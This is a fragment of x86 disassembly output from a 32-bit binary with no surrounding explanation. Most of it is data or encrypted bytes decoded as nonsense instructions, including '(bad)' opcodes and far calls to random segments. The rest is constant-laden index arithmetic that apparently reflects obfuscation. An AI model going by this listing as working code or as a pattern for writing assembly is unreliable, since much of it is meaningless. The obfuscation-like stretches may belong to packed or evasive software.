  410931:	loopne 0x410958
  410933:	dec    ebx
  410934:	pop    ecx
  410935:	inc    eax
  410936:	add    al,0xd
  410938:	sti    
  410939:	call   0xf339:0xbb111b62
  410940:	jecxz  0x41090f
  410942:	push   edi
  410943:	add    BYTE PTR [ebx],0x12
  410946:	pusha  
  410947:	cdq    
  410948:	mov    ch,BYTE PTR [edx-0x25]
  41094b:	mov    esi,0x68abdf3f
  410950:	fcom   QWORD PTR [edx+0x48e32a52]
  410956:	in     al,dx
  410957:	inc    edx
  410958:	cmc    
  410959:	xchg   ecx,eax
  41095a:	push   ebx
  41095b:	(bad)  
  41095c:	sbb    eax,0xb912664b
  410961:	lahf   
  410962:	sub    DWORD PTR [esi],0xe32e9cc0
  410968:	(bad)  
  410969:	mov    ebx,0xfd4dce2c
  41096e:	iret   
  41096f:	or     BYTE PTR [ebp+edi*1+0x599e4aa4],ah
  410976:	inc    edi
  410977:	push   ds
  410978:	js     0x4109a0
  41097a:	jmp    0xfd322b37
  41097f:	cld    
  410980:	cld    
  410981:	(bad)  
  410983:	jno    0x410992
  410985:	pop    edi
  410986:	test   BYTE PTR [edx+0x4c358c1d],ah
  41098c:	mov    edx,0x788b7d97
  410991:	call   0x2e32:0xe9b1d1ed
  410998:	mov    al,0xd5
  41099a:	out    0x43,eax
  41099c:	jmp    0xe13fa837
  4109a1:	lock ror BYTE PTR [edi+ebx*8-0x47],1
  4109a6:	daa    
  4109a7:	jl     0x4109f8
  4109a9:	inc    ebp
  4109aa:	sbb    eax,0xe2035855
  4109af:	dec    esp
  4109b0:	or     al,BYTE PTR [ebx+ecx*2+0x68]
  4109b4:	(bad)  
  4109b5:	hlt    
  4109b6:	inc    edx
  4109b7:	aad    0xc
  4109b9:	test   al,0x4f
  4109bb:	or     eax,0x58c4
  4109c0:	xor    edx,0x7a7a
  4109c6:	xor    eax,0x5278
  4109cb:	push   edx
  4109cc:	push   eax
  4109cd:	call   0x4220b1
  4109d2:	mov    DWORD PTR [esi],eax
  4109d4:	mov    DWORD PTR [ebp-0x20],0x3354
  4109db:	mov    DWORD PTR [ebp-0x1c],0x7d8c
  4109e2:	mov    DWORD PTR [ebp-0x18],0x3d36
  4109e9:	mov    DWORD PTR [ebp-0x14],0x51ef
  4109f0:	xor    edi,edi
  4109f2:	mov    DWORD PTR [ebp-0xc],0x3358
  4109f9:	push   0xc9f
  4109fe:	inc    edi
  4109ff:	mov    DWORD PTR [ebp-0x4],edi
  410a02:	mov    eax,DWORD PTR [ebp-0x18]
  410a05:	mov    ecx,DWORD PTR [ebp-0x14]
  410a08:	push   0x1c19
  410a0d:	push   ecx
  410a0e:	push   eax
  410a0f:	call   0x416c20
  410a14:	mov    ecx,DWORD PTR [ebp-0x20]
  410a17:	mov    ebx,DWORD PTR [ebp-0x1c]
  410a1a:	or     eax,ecx
  410a1c:	or     edx,ebx
  410a1e:	push   0x20fa
  410a23:	add    eax,0x7fac
  410a28:	push   0x1cd48ab
  410a2d:	adc    edx,0x133b
  410a33:	push   edx
  410a34:	push   eax
  410a35:	call   0x4220b1
  410a3a:	mov    ebx,DWORD PTR [ebp-0x4]
  410a3d:	lea    ecx,[eax-0x5d40]
  410a43:	xor    edx,edx
  410a45:	mov    eax,0x16c2
  410a4a:	div    ebx
  410a4c:	mov    edx,DWORD PTR [ebp-0xc]
  410a4f:	sub    eax,edx
  410a51:	mov    DWORD PTR [esi+eax*4+0x725c],ecx
  410a58:	mov    DWORD PTR [ebp-0x14],0x6af0
  410a5f:	jmp    0x410d3f
  410a64:	jno    0x410a88
  410a66:	xchg   DWORD PTR [esi+0x1a20b23a],esi
  410a6c:	mul    DWORD PTR [edx-0x6d]
  410a6f:	mov    esp,0x6a06e24b
  410a74:	jmp    0x1814:0x9a181888
  410a7b:	sbb    BYTE PTR [edi+0x3328d932],dh
  410a81:	adc    BYTE PTR [edx+ecx*2+0x6b],cl
  410a85:	lods   al,BYTE PTR ds:[esi]
  410a86:	xchg   ecx,eax
  410a87:	retf   0xd01e
  410a8a:	(bad)  
  410a8b:	(bad)
  410a8f:	nop
  410a90:	sub    esi,DWORD PTR [ecx+0x16]
  410a93:	mov    dl,BYTE PTR [edx-0x571db95]
  410a99:	outs   dx,BYTE PTR ds:[esi]
  410a9a:	and    al,0x58
  410a9c:	dec    ecx
  410a9d:	jno    0x410a51
  410a9f:	push   esp
  410aa0:	retf   0xac62
  410aa3:	pop    esi
  410aa4:	adc    ebx,DWORD PTR [eax+ebx*4]
  410aa7:	fwait
  410aa8:	mov    ecx,0xbf2aae7
  410aad:	inc    ebx
  410aae:	jmp    0xcf9e2c7e
  410ab3:	inc    esi
  410ab4:	lock jge 0x410a5c
  410ab7:	dec    edx
  410ab8:	mov    cl,0xdb
  410aba:	leave  
  410abb:	jge    0x410aa8
  410abd:	and    eax,0x90b115cd
  410ac2:	adc    al,ah
  410ac4:	mov    dl,0xb2
  410ac6:	jns    0x410b3e
  410ac8:	mov    ds:0xc8bfe184,al
  410acd:	and    BYTE PTR [edx],bl
  410acf:	jle    0x410ab3
  410ad1:	inc    DWORD PTR [eax-0x76222838]
  410ad7:	mov    ds:0xa255b997,eax
  410adc:	ja     0x410b52
  410ade:	stc    
  410adf:	pop    edx
  410ae0:	adc    eax,0xa012b2c1
  410ae5:	adc    al,0xdf
  410ae7:	inc    ecx
  410ae8:	jecxz  0x410a91
  410aea:	sbb    eax,DWORD PTR [edi-0x3b]
  410aed:	cld    
  410aee:	imul   DWORD PTR [edx+0x4fc86a3d]
  410af4:	and    dh,dh
  410af6:	fcmovnu st,st(2)
  410af8:	mov    dh,0x52
  410afa:	mov    dl,0x8b
  410afc:	retf   
  410afd:	mov    esp,0xd5039cd1
  410b02:	sub    BYTE PTR [edi],ah
  410b04:	add    BYTE PTR [esi-0x19],ah
  410b07:	pop    edx
  410b08:	jl     0x410af6
  410b0a:	daa    
  410b0b:	dec    edx
  410b0c:	or     DWORD PTR [ebx-0x53e7c879],0x79
  410b13:	mov    al,ds:0x976f7aa6
  410b18:	pop    ds
  410b19:	scas   al,BYTE PTR es:[edi]
  410b1a:	aam    0xb6
  410b1c:	mov    bl,dl
  410b1e:	fcmovbe st,st(1)
  410b20:	mov    ds:0xcc02a2ed,eax
  410b25:	test   al,0x53
  410b27:	(bad)  
  410b28:	pop    ss
  410b29:	xor    cl,BYTE PTR [esi]
  410b2b:	xlat   BYTE PTR ds:[ebx]
  410b2c:	(bad)  
  410b2d:	or     al,0x1a
  410b2f:	jg     0x410b08
  410b31:	call   0xdc41cfd5
  410b36:	pop    ebx
  410b37:	cmp    BYTE PTR [ecx],bh
  410b39:	out    dx,al
  410b3a:	fsubr  QWORD PTR [ecx+0xa0d7169]
  410b40:	adc    cl,BYTE PTR [ecx+0x1f974603]
  410b46:	mov    cl,0x48
  410b48:	push   cs
  410b49:	push   ecx
  410b4a:	imul   esp,DWORD PTR [esi-0xfb29fc1],0x3b
  410b51:	inc    edx
  410b52:	or     al,0x4c
  410b54:	nop
  410b55:	test   eax,0x7fc9771c
  410b5a:	inc    esp
  410b5b:	dec    esp
  410b5c:	(bad)  
  410b5d:	lds    esp,FWORD PTR [ecx+0x3a]
  410b60:	sub    eax,0x4f8b490d
  410b65:	pop    edx
  410b66:	fidivr WORD PTR [esi+0x15]
  410b69:	in     eax,0xae
  410b6b:	ret    
  410b6c:	mov    eax,0x5a1686d6
  410b71:	aas    
  410b72:	sub    BYTE PTR [esp+esi*1+0x34],bl
  410b76:	and    DWORD PTR [edx],edi
  410b78:	ds push ebp
  410b7a:	cmp    DWORD PTR [edx],edx
  410b7c:	xor    dl,ah
  410b7e:	rol    al,1
  410b80:	cmp    bl,BYTE PTR [edi-0x789d7855]
  410b86:	push   es
  410b87:	push   esp
  410b88:	arpl   di,si
  410b8a:	fidivr WORD PTR [esi]
  410b8c:	nop
  410b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b8e:	int    0x83
  410b90:	adc    dl,BYTE PTR es:[bx-0x38d2]
  410b96:	mov    bl,0xe8
  410b98:	sbb    DWORD PTR [ebx-0x2c],edx
  410b9b:	les    ebx,FWORD PTR [edx+0x2d]
  410b9e:	sbb    BYTE PTR [eax-0x62],0x8c
  410ba2:	cmp    DWORD PTR [eax],esp
  410ba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ba5:	aaa    
  410ba6:	mov    ebx,0x7207278
  410bab:	repnz hlt 
  410bad:	inc    ebp
  410bae:	repz dec eax
  410bb0:	cli    
  410bb1:	sub    eax,eax
  410bb3:	add    cl,ah
  410bb5:	sub    eax,DWORD PTR [ecx+0x6]
  410bb8:	test   al,0xdf
  410bba:	dec    ecx
  410bbb:	ja     0x410c2a
  410bbd:	(bad)  
  410bbe:	inc    eax
  410bbf:	scas   eax,DWORD PTR es:[edi]
  410bc0:	enter  0xd6e7,0x9f
  410bc4:	ja     0x410c00
  410bc6:	mov    ebp,0xf7006987
  410bcb:	sbb    bh,BYTE PTR [edx]
  410bcd:	sar    BYTE PTR [eax+edx*8+0x2b],1
  410bd1:	test   al,0x13
  410bd3:	xrelease mov BYTE PTR [edx-0x58948459],bh
  410bda:	jns    0x410c45
  410bdc:	dec    ebx
  410bdd:	sahf   
  410bde:	js     0x410c58
  410be0:	data16 mov WORD PTR [eax+0x4f383868],es
  410be7:	js     0x410b6d
  410be9:	push   cs
  410bea:	shr    DWORD PTR [ebx+0x29],cl
  410bed:	repz push eax
  410bef:	inc    ecx
  410bf0:	push   0x385d4cd1
  410bf5:	jno    0x410be7
  410bf7:	imul   ebx,DWORD PTR [ebp+esi*1-0x25c20996],0xaa33857d
  410c02:	push   ss
  410c03:	add    eax,0xaf2cd2fa
  410c08:	sub    bl,bh
  410c0a:	push   esi
  410c0b:	dec    eax
  410c0c:	push   es
  410c0d:	dec    eax
  410c0e:	dec    ecx
  410c0f:	xchg   esp,eax
  410c10:	sbb    ebx,eax
  410c12:	add    al,0xd6
  410c14:	pusha  
  410c15:	push   DWORD PTR [esi-0x7]
  410c18:	lods   eax,DWORD PTR ds:[esi]
  410c19:	stc    
  410c1a:	iret   
  410c1b:	pop    DWORD PTR [edi+0x3a387aa1]
  410c21:	jbe    0x410bf0
  410c23:	outs   dx,BYTE PTR ds:[esi]
  410c24:	mov    esi,0x2e1c0635
  410c29:	pop    ebp
  410c2a:	cmp    cl,BYTE PTR [esi]
  410c2c:	loop   0x410ca6
  410c2e:	hlt    
  410c2f:	daa    
  410c30:	(bad)  
  410c31:	clc    
  410c32:	adc    al,0x85
  410c34:	stos   DWORD PTR es:[edi],eax
  410c35:	fcos   
  410c37:	iret   
  410c38:	pop    edx
  410c39:	and    DWORD PTR [esi],edi
  410c3b:	aas    
  410c3c:	fidiv  WORD PTR [edx-0x76af4e36]
  410c42:	scas   eax,DWORD PTR es:[edi]
  410c43:	scas   al,BYTE PTR es:[edi]
  410c44:	cmp    BYTE PTR [edi],bh
  410c46:	push   ebp
  410c47:	stos   DWORD PTR es:[edi],eax
  410c48:	loope  0x410c09
  410c4a:	jb     0x410c67
  410c4c:	mov    al,ds:0x1abdec8c
  410c51:	cmc    
  410c52:	int    0x4f
  410c54:	or     ebx,DWORD PTR [ebx]
  410c56:	inc    edi
  410c57:	test   bh,dh
  410c59:	mov    DWORD PTR ds:0x88ad38c6,esp
  410c5f:	push   ds
  410c60:	or     DWORD PTR [ebx-0x1becb4b1],ebx
  410c66:	mov    BYTE PTR [edi],0x49
  410c69:	xchg   ebp,eax
  410c6a:	jo     0x410c09
  410c6c:	imul   ecx,DWORD PTR [edi],0xffffff90
  410c6f:	loope  0x410cb8
  410c71:	js     0x410c63
  410c73:	inc    eax
  410c74:	push   cs
  410c75:	sub    cl,ah
  410c77:	jmp    0x80b75c3e
  410c7c:	sub    BYTE PTR [esi+0x1a],bl
  410c7f:	(bad)  
  410c80:	sub    eax,ecx
  410c82:	gs mov ebx,0x3d30aca5
  410c88:	repnz leave 
  410c8a:	adc    al,0x17
  410c8c:	(bad)  
  410c8d:	sub    eax,0x40d850f6
  410c92:	jmp    0x410cc0
  410c94:	mov    ds:0x74e7c880,eax
  410c99:	and    eax,0xd4427611
  410c9e:	pusha  
  410c9f:	adc    BYTE PTR [ebx+0x9358bf2],0xe1
  410ca6:	xchg   ecx,ebx
  410ca8:	inc    edx
  410ca9:	loope  0x410cb0
  410cab:	stos   BYTE PTR es:[edi],al
  410cac:	pop    ebp
  410cad:	ins    BYTE PTR es:[edi],dx
  410cae:	jp     0x410cd2
  410cb0:	cmc    
  410cb1:	enter  0x5e65,0xd0
  410cb5:	sub    eax,0x33eff739
  410cba:	fsub   QWORD PTR [ecx-0x11]
  410cbd:	xchg   edx,eax
  410cbe:	imul   edx,ebp,0x8e3fbe13
  410cc4:	add    cl,BYTE PTR [edi]
  410cc6:	das    
  410cc7:	or     DWORD PTR [edi-0x402b66fd],0xffffffff
  410cce:	adc    eax,0xaecf5754
  410cd3:	in     eax,0xb5
  410cd5:	sub    cl,ch
  410cd7:	imul   DWORD PTR [eax-0x3cd6219]
  410cdd:	sub    edx,DWORD PTR [edx-0x77f5cd66]
  410ce3:	mov    ch,0x6f
  410ce5:	sti    
  410ce6:	jbe    0x410d4f
  410ce8:	adc    ah,BYTE PTR gs:[edx+eiz*4+0x2485929a]
  410cf0:	mov    ah,BYTE PTR [esp+esi*8]
  410cf3:	pop    ss
  410cf4:	ret    
  410cf5:	cmp    ah,BYTE PTR [esi-0x3f]
  410cf8:	sbb    ebp,DWORD PTR [edx-0x7f]
  410cfb:	aam    0xfc
  410cfd:	inc    edi
  410cfe:	inc    eax
  410cff:	mov    bh,0xb4
  410d01:	pop    edi
  410d02:	push   es
  410d03:	lea    esp,[edx-0x61]
  410d06:	jge    0x410caa
  410d08:	sub    eax,0xc20681c5
  410d0d:	jg     0x410d1a
  410d0f:	add    bl,0x1a
  410d12:	mov    dl,0x4b
  410d14:	jge    0x410d61
  410d16:	not    al
  410d18:	sub    eax,0x7f45d68e
  410d1d:	push   ecx
  410d1e:	push   ds
  410d1f:	jbe    0x410d41
  410d21:	jg     0x410d36
  410d23:	mov    edx,0xb3de40ca
  410d28:	add    edi,DWORD PTR [edi+eiz*4]
  410d2b:	xchg   esp,eax
  410d2c:	push   0x30
  410d2e:	pop    edx
  410d2f:	dec    eax
  410d30:	mov    ds:0x85c1779f,eax
  410d35:	xor    bh,cl
  410d37:	add    eax,0x540bc11b
  410d3c:	outs   dx,BYTE PTR ds:[esi]
  410d3d:	jp     0x410cd6
  410d3f:	mov    DWORD PTR [ebp-0x4],edi
  410d42:	mov    DWORD PTR [ebp-0xc],0x2c8a
  410d49:	mov    ecx,DWORD PTR [ebp-0xc]
  410d4c:	mov    eax,0x4401
  410d51:	sub    eax,ecx
  410d53:	jmp    0x411033
  410d58:	test   eax,0x82368522
  410d5d:	mov    ss:0x6b32522,al
  410d63:	push   0xffffff8a
  410d65:	fcomip st,st(2)
  410d67:	push   0x6d
  410d69:	sbb    BYTE PTR [eax],0x18
  410d6c:	call   0x8546:0xb6181814
  410d73:	sub    BYTE PTR [ebx-0x31c75d4a],dh
  410d79:	jmp    FWORD PTR [ecx+0x3898f2a5]
  410d7f:	xor    edi,DWORD PTR [eax+0x7ce41378]
  410d85:	ffreep st(6)
  410d87:	icebp  
  410d88:	cli    
  410d89:	lods   al,BYTE PTR ds:[esi]
  410d8a:	jnp    0x410d68
  410d8c:	push   ebx
  410d8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410d8e:	cmp    al,0xfa
  410d90:	in     al,dx
  410d91:	lea    eax,[edi]
  410d93:	test   al,0x86
  410d95:	stc    
  410d96:	adc    bh,BYTE PTR [ebx-0x66]
  410d99:	fidivr DWORD PTR [eax]
  410d9b:	jl     0x410d71
  410d9d:	pop    ss
  410d9e:	push   0xffffffe3
  410da0:	pusha  
  410da1:	or     BYTE PTR [ebp+ecx*8+0x544265fb],ch
  410da8:	dec    esi
  410da9:	xlat   BYTE PTR ds:[ebx]
  410daa:	sub    BYTE PTR [esi-0x7696282e],ah
  410db0:	dec    esp
  410db1:	jge    0x410dcf
  410db3:	arpl   WORD PTR [eax],sp
  410db5:	jmp    0x410dd4
  410db7:	retf   0xb5e7
  410dba:	in     eax,dx
  410dbb:	inc    ecx
  410dbc:	add    ch,BYTE PTR [esi-0x1691ef59]
  410dc2:	stos   DWORD PTR es:[edi],eax
  410dc3:	les    ebx,FWORD PTR [ebx]
  410dc5:	aaa    
  410dc6:	xor    eax,0x77c4e6c2
  410dcb:	mov    al,0xb0
  410dcd:	out    dx,eax
  410dce:	jnp    0x410e01
  410dd0:	cmp    eax,0xb2a226ba
  410dd5:	loop   0x410d8e
  410dd7:	shl    DWORD PTR [ebx+0x48d5b353],0xa1
  410dde:	iret   
  410ddf:	scas   eax,DWORD PTR es:[edi]
  410de0:	mov    ds:0x14012ade,eax
  410de5:	xor    ebp,DWORD PTR [eax+0x4a]
  410de8:	adc    ebp,DWORD PTR [edx+ebx*4-0x532fd561]
  410def:	jmp    DWORD PTR [ebx-0xb7cc883]
  410df5:	or     eax,0xd111eb0b
  410dfa:	xchg   esi,eax
  410dfb:	mov    ah,0x83
  410dfd:	mov    ah,0xb7
  410dff:	in     eax,dx
  410e00:	pop    esp
  410e01:	fwait
  410e02:	inc    edi
  410e03:	adc    BYTE PTR [ecx-0xd],cl
  410e06:	dec    edi
  410e07:	pop    esi
  410e08:	add    BYTE PTR [ecx-0xcfd14a3],bh
  410e0e:	or     bl,BYTE PTR [ebx+edi*1-0x7d01aa92]
  410e15:	stos   BYTE PTR es:[edi],al
  410e16:	addr16 mov ds:0x7625,eax
  410e1a:	jno    0x410df6
  410e1c:	rcl    BYTE PTR [esi-0x4b],cl
  410e1f:	mov    ch,0xd6
  410e21:	out    dx,eax
  410e22:	in     al,0x4a
  410e24:	mov    bh,0xb
  410e26:	enter  0xb3b6,0x6b
  410e2a:	ins    BYTE PTR es:[edi],dx
  410e2b:	gs push esi
  410e2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410e2e:	mov    ebx,0xf592d80e
  410e33:	ins    DWORD PTR es:[edi],dx
  410e34:	pop    ss
  410e35:	in     al,0xea
  410e37:	outs   dx,BYTE PTR ds:[esi]
  410e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410e39:	mov    ds:0x284b07be,eax
  410e3e:	fadd   DWORD PTR cs:[ecx-0x24324959]
  410e46:	sub    BYTE PTR [ecx+ebp*1],al
  410e49:	ins    DWORD PTR es:[edi],dx
  410e4a:	sbb    al,BYTE PTR [edx+0x28]
  410e4d:	call   0x9a1d:0xbf959a09
  410e54:	cdq    
  410e55:	mov    esi,0xe4850731
  410e5a:	arpl   WORD PTR [ebx+ecx*8],sp
  410e5d:	repnz inc esp
  410e5f:	out    0x31,al
  410e61:	clc    
  410e62:	pushf  
  410e63:	sti    
  410e64:	std    
  410e65:	pop    esp
  410e66:	push   0xffffffd3
  410e68:	or     BYTE PTR [esp+ecx*2-0x740cb3d],bh
  410e6f:	sbb    eax,0x37c1f522
  410e74:	sbb    al,al
  410e76:	or     al,BYTE PTR [edx-0x67deb2e4]
  410e7c:	cmp    BYTE PTR [ebx-0x46],cl
  410e7f:	nop
  410e80:	cdq    
  410e81:	sub    eax,0x7a60c05e
  410e86:	arpl   WORD PTR [edi+0x1e71548e],cx
  410e8c:	cmp    BYTE PTR [edx+ebp*2+0x9ce18c],al
  410e93:	out    dx,eax
  410e94:	ins    BYTE PTR es:[edi],dx
  410e95:	mov    WORD PTR [esi+0xc],?
  410e98:	or     BYTE PTR [ebx-0x3],ah
  410e9b:	jg     0x410f0e
  410e9d:	inc    eax
  410e9e:	dec    edi
  410e9f:	fisttp QWORD PTR [ebx-0x323f57a3]
  410ea5:	popa   
  410ea6:	or     BYTE PTR [ebp+0x2169a0f2],cl
  410eac:	aam    0x8a
  410eae:	bound  ebp,QWORD PTR [esi]
  410eb0:	push   0xa081098f
  410eb5:	clc    
  410eb6:	call   0x1bfe:0x3f3e
  410ebc:	mov    edx,0xd558166a
  410ec1:	sbb    al,0x5e
  410ec3:	add    esi,DWORD PTR [edx+0x5d]
  410ec6:	repnz call 0xf48:0xc06df71a
  410ece:	rcr    DWORD PTR [edx],cl
  410ed0:	loopne 0x410f06
  410ed2:	adc    esp,DWORD PTR [esp+edx*8-0xf]
  410ed6:	jge    0x410e93
  410ed8:	cli    
  410ed9:	push   ds
  410eda:	cmp    DWORD PTR [eax-0x764ff995],ebx
  410ee0:	cdq    
  410ee1:	inc    esp
  410ee2:	cmc    
  410ee3:	aaa    
  410ee4:	ret    
  410ee5:	mov    edx,0xa2401dd8
  410eea:	dec    esp
  410eeb:	add    edx,esp
  410eed:	popf   
  410eee:	add    al,0xca
  410ef0:	shl    DWORD PTR [ebx-0x45565ac0],0x29
  410ef7:	loopne 0x410f0a
  410ef9:	inc    ecx
  410efa:	inc    eax
  410efb:	lahf   
  410efc:	js     0x410f25
  410efe:	push   ecx
  410eff:	push   ss
  410f00:	out    dx,eax
  410f01:	pushf  
  410f02:	(bad)  
  410f03:	aas    
  410f04:	dec    esi
  410f05:	sbb    eax,0x847e9dc4
  410f0a:	ja     0x410eaf
  410f0c:	mov    WORD PTR [edi+0x54],ss
  410f0f:	add    BYTE PTR [ebx-0x43135624],al
  410f15:	in     al,dx
  410f16:	(bad)  
  410f17:	and    DWORD PTR [esi-0x549a7c6e],edi
  410f1d:	stos   BYTE PTR es:[edi],al
  410f1e:	mov    edi,0x90662c87
  410f23:	lds    ebp,FWORD PTR [ebp-0x32]
  410f26:	hlt    
  410f27:	pop    esp
  410f28:	cs mov ah,0x49
  410f2b:	popa   
  410f2c:	add    BYTE PTR [edi-0x6bb6fb0],dl
  410f32:	test   eax,0x6c1c7844
  410f37:	cmp    BYTE PTR ds:0x9491e773,0xee
  410f3e:	fcomp  DWORD PTR [ebp-0x56]
  410f41:	push   ds
  410f42:	sub    BYTE PTR [ebx-0x2d708af9],dl
  410f48:	or     edx,DWORD PTR [ecx-0x7f2863a3]
  410f4e:	(bad)  
  410f4f:	mov    ebp,0x45452a1
  410f54:	mov    edi,0xa33def42
  410f59:	dec    ecx
  410f5a:	shr    DWORD PTR [esi+0x78],cl
  410f5d:	push   es
  410f5e:	das    
  410f5f:	pop    ebx
  410f60:	ret    
  410f61:	pushf  
  410f62:	push   ebx
  410f63:	dec    edi
  410f64:	inc    esp
  410f65:	mul    DWORD PTR [edx*1-0x6b789b72]
  410f6c:	push   0xffffff95
  410f6e:	popf   
  410f6f:	jecxz  0x410fab
  410f71:	or     dh,BYTE PTR [ebx-0x36dfcaf0]
  410f77:	test   DWORD PTR [ebp+ecx*8+0x74],ecx
  410f7b:	lods   al,BYTE PTR ds:[esi]
  410f7c:	loopne 0x410fab
  410f7e:	push   ecx
  410f7f:	sahf   
  410f80:	sub    ah,dl
  410f82:	out    0xd0,al
  410f84:	arpl   WORD PTR [edx],cx
  410f86:	data16 jg 0x410fc5
  410f89:	pop    esi
  410f8a:	jl     0x41100a
  410f8c:	cmovl  ebp,DWORD PTR [eax]
  410f8f:	jmp    0x410f7a
  410f91:	imul   esp,DWORD PTR [ecx-0x5adac70e],0xd667b45e
  410f9b:	sbb    eax,DWORD PTR [ecx+edi*8+0x7510c028]
  410fa2:	dec    esi
  410fa3:	push   cs
  410fa4:	xor    BYTE PTR [eax-0x7b731c88],al
  410faa:	popf   
  410fab:	mov    ecx,0x334bd38
  410fb0:	mov    eax,gs:0xd9102c1d
  410fb6:	or     al,0x89
  410fb8:	push   edx
  410fb9:	inc    ebx
  410fba:	clc    
  410fbb:	std    
  410fbc:	add    al,0xb2
  410fbe:	adc    eax,0xba0ed1e8
  410fc3:	jns    0x410ffe
  410fc5:	mov    dh,bh
  410fc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410fc8:	jge    0x41100e
  410fca:	inc    edx
  410fcb:	pop    edi
  410fcc:	loope  0x410fe0
  410fce:	cmp    ebp,edi
  410fd0:	add    al,BYTE PTR [esi+esi*1+0x25601a50]
  410fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410fd8:	inc    esi
  410fd9:	push   cs
  410fda:	sbb    bl,al
  410fdc:	cli    
  410fdd:	retf   
  410fde:	push   ds
  410fdf:	fiadd  DWORD PTR [edx+0x74230a6b]
  410fe6:	xchg   cx,ax
  410fe8:	outs   dx,DWORD PTR ds:[esi]
  410fe9:	in     eax,0x5
  410feb:	push   0x27
  410fed:	fisttp QWORD PTR [esi]
  410fef:	push   ebp
  410ff0:	xlat   BYTE PTR ds:[ebx]
  410ff1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ff2:	cwde   
  410ff3:	push   0xffffffc1
  410ff5:	pop    ss
  410ff6:	inc    esi
  410ff7:	add    al,0x84
  410ff9:	cmp    DWORD PTR [edx-0x1c9933be],esi
  410fff:	mov    ebp,0x7ce51d87
  411004:	push   edi
  411005:	push   eax
  411006:	xor    eax,0x1a5bed35
  41100b:	das    
  41100c:	mov    eax,0xef0499c7
  411011:	push   es
  411012:	inc    edx
  411013:	and    al,0x6f
  411015:	push   edx
  411016:	push   cs
  411017:	jo     0x410faa
  411019:	call   0xa345:0x815c8c31
  411020:	das    
  411021:	fisubr DWORD PTR [ecx+0x37]
  411024:	in     al,0xc2
  411026:	push   ds
  411027:	into   
  411028:	mov    ah,0x44
  41102a:	push   eax
  41102b:	jnp    0x410fcc
  41102d:	push   es
  41102e:	mov    dl,0xbe
  411030:	add    eax,0x4d8ba153
  411035:	cld    
  411036:	xor    edx,edx
  411038:	div    ecx
  41103a:	mov    ecx,DWORD PTR [ebp-0x14]
  41103d:	xor    eax,0xa80
  411042:	or     eax,0x343b
  411047:	or     eax,ecx
  411049:	mov    ecx,DWORD PTR [ebp+0x8]
  41104c:	mov    DWORD PTR [esi+eax*4-0x1fff4],ecx
  411053:	mov    DWORD PTR [ebp-0xc],0x327f
  41105a:	mov    DWORD PTR [ebp-0x14],0x5215
  411061:	mov    DWORD PTR [ebp+0x8],0x2502
  411068:	mov    eax,DWORD PTR [ebp+0x8]
  41106b:	add    eax,DWORD PTR [ebp-0x14]
  41106e:	mov    ecx,DWORD PTR [ebp-0xc]
  411071:	and    eax,0x2bab
  411076:	lea    eax,[eax+ecx*1-0x557f]
  41107d:	mov    ecx,DWORD PTR [ebp+0xc]
  411080:	mov    DWORD PTR [esi+eax*4],ecx
  411083:	mov    DWORD PTR [ebp-0xc],edi
  411086:	mov    DWORD PTR [ebp+0x8],0x5f40
  41108d:	mov    DWORD PTR [ebp-0x14],0x6ba4
  411094:	mov    DWORD PTR [ebp+0xc],0x7b17
  41109b:	mov    ecx,DWORD PTR [ebp+0x8]
  41109e:	mov    eax,0x43d2
  4110a3:	sub    eax,ecx
  4110a5:	add    eax,DWORD PTR [ebp+0xc]
  4110a8:	xor    edx,edx
  4110aa:	add    eax,DWORD PTR [ebp-0x14]
  4110ad:	mov    ecx,DWORD PTR [ebp-0xc]
  4110b0:	div    ecx
  4110b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4110b5:	xor    edx,edx
  4110b7:	pop    edi
  4110b8:	pop    ebx
  4110b9:	or     eax,0x67ad
  4110be:	mov    DWORD PTR [esi+eax*4-0x3bfa4],ecx
  4110c5:	mov    DWORD PTR [ebp+0x10],0x517b
  4110cc:	mov    DWORD PTR [ebp+0xc],0x5d62
  4110d3:	mov    DWORD PTR [ebp+0x8],0x41b0
  4110da:	mov    ecx,DWORD PTR [ebp+0x8]
  4110dd:	mov    eax,DWORD PTR [ebp+0xc]
  4110e0:	and    ecx,0x68c1
  4110e6:	sub    ecx,0x6fd3
  4110ec:	or     ecx,eax
  4110ee:	mov    eax,DWORD PTR [ebp+0x10]
  4110f1:	imul   ecx,eax
  4110f4:	mov    eax,0xf52840d5
  4110f9:	div    ecx
  4110fb:	leave  
  4110fc:	ret    0xc
  4110ff:	push   ebp
  411100:	mov    ebp,esp
  411102:	sub    esp,0xc0
  411108:	push   esi
  411109:	mov    DWORD PTR [ebp-0x80],0x2f93
  411110:	mov    DWORD PTR [ebp-0x7c],0x3321
  411117:	mov    DWORD PTR [ebp-0x70],0x7d00
  41111e:	mov    DWORD PTR [ebp-0x6c],0xd87
  411125:	mov    DWORD PTR [ebp-0x60],0x4197
  41112c:	mov    DWORD PTR [ebp-0x5c],0xa7d
  411133:	mov    DWORD PTR [ebp-0x50],0x772d
  41113a:	mov    DWORD PTR [ebp-0x4c],0x37d8
  411141:	mov    DWORD PTR [ebp-0x40],0x414a
  411148:	mov    DWORD PTR [ebp-0x3c],0x55ef
  41114f:	mov    DWORD PTR [ebp-0x30],0x136b
  411156:	mov    DWORD PTR [ebp-0x2c],0x53e4
  41115d:	mov    DWORD PTR [ebp-0x20],0x32d8
  411164:	mov    DWORD PTR [ebp-0x1c],0x5cb6
  41116b:	mov    DWORD PTR [ebp-0xc],0x3956
  411172:	mov    DWORD PTR [ebp-0xa4],0x4e57
  41117c:	mov    DWORD PTR [ebp-0x94],0x1
  411186:	mov    DWORD PTR [ebp-0x14],0x17ab
  41118d:	mov    DWORD PTR [ebp-0x64],0x7a3d
  411194:	mov    DWORD PTR [ebp-0x54],0x378a
  41119b:	mov    DWORD PTR [ebp-0x74],0x5a00
  4111a2:	mov    DWORD PTR [ebp-0x24],0x1f3a
  4111a9:	mov    DWORD PTR [ebp-0x84],0x9a225
  4111b3:	mov    DWORD PTR [ebp-0x44],0x31f8
  4111ba:	mov    DWORD PTR [ebp-0x34],0x3663
  4111c1:	mov    DWORD PTR [ebp-0xb4],0x3165
  4111cb:	mov    DWORD PTR [ebp-0xc0],0x1ebe
